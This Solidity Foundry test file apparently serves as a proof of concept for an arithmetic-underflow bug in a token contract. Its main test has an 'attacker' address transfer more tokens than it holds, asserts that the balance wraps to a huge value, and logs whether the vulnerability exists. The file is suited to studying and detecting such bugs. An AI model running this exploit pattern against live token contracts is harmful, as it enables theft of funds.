// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/token.sol";

contract TokenTest is Test {
    Token token;
    address owner = address(0x1);
    address attacker = address(0x2);

    function setUp() public {
        vm.startPrank(owner);
        token = new Token(1000); // Initialize with 1000 tokens
        vm.stopPrank();

        // Give attacker some initial balance
        vm.prank(owner);
        token.transfer(attacker, 10);
    }

    function testArithmeticUnderflow() public {
        // Check initial balances
        uint256 attackerInitialBalance = token.balanceOf(attacker);
        uint256 ownerInitialBalance = token.balanceOf(owner);
        assertEq(attackerInitialBalance, 10);
        assertEq(ownerInitialBalance, 990);
        
        console.log("--- BEFORE-Trigger Transfer ---");
        console.log("attacker balance:", attackerInitialBalance);
        console.log("owner balance:", ownerInitialBalance);

        console.log("--- Trigger Transfer (attempt to transfer 11) ---");
        // Attacker attempts to transfer more than their balance
        vm.prank(attacker);
        token.transfer(owner, 11);

        console.log("--- AFTER-Trigger Transfer ---");
        uint256 attackerFinalBalance = token.balanceOf(attacker);
        uint256 ownerFinalBalance = token.balanceOf(owner);
        console.log("attacker balance:", attackerFinalBalance);
        console.log("owner balance:", ownerFinalBalance);

        // Verify underflow occurred (balance becomes extremely large)
        assertGt(attackerFinalBalance, type(uint256).max - 100);
        // Owner receives the tokens despite attacker not having enough
        assertEq(ownerFinalBalance, ownerInitialBalance + 11);

        // Differential verification
        if (attackerFinalBalance > type(uint256).max - 100) {
            console.log("Vulnerability Exists: Arithmetic underflow allows attacker to underflow balance and gain excess tokens");
        } else {
            console.log("Vulnerability not Exist: Transfer function prevents balance underflow");
        }
    }

    function testNormalTransfer() public {
        // Normal transfer works correctly
        vm.prank(attacker);
        token.transfer(owner, 5);

        assertEq(token.balanceOf(attacker), 5);
        assertEq(token.balanceOf(owner), 995);
    }
}